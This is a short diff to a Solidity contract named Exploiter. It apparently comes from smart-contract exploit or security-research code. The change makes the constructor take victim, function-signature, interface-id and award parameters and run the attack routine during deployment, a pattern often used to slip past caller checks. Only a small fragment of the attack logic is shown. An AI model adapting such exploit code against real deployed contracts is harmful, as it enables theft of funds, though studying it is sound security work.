@@ -176,11 +176,12 @@ interface InterfaceContract{
 
 contract Exploiter{
     address public _target;
-    constructor(){
+    constructor(address victim,bytes4 funcSig,bytes4 ifceId,address award,bool callSuccess ) payable{
         // console.log(" --- Exploiter::()# created");
+        execute(victim,funcSig,ifceId,award,callSuccess );
     }
 
-    function execute(address victim,bytes4 funcSig,bytes4 ifceId,address award,bool callSuccess ) external payable {
+    function execute(address victim,bytes4 funcSig,bytes4 ifceId,address award,bool callSuccess ) public payable {
         // console.log("#############################################################");
         DeployInterface deployer = new DeployInterface{salt:0x0}();
         address target = deployer.deploy(ifceId);
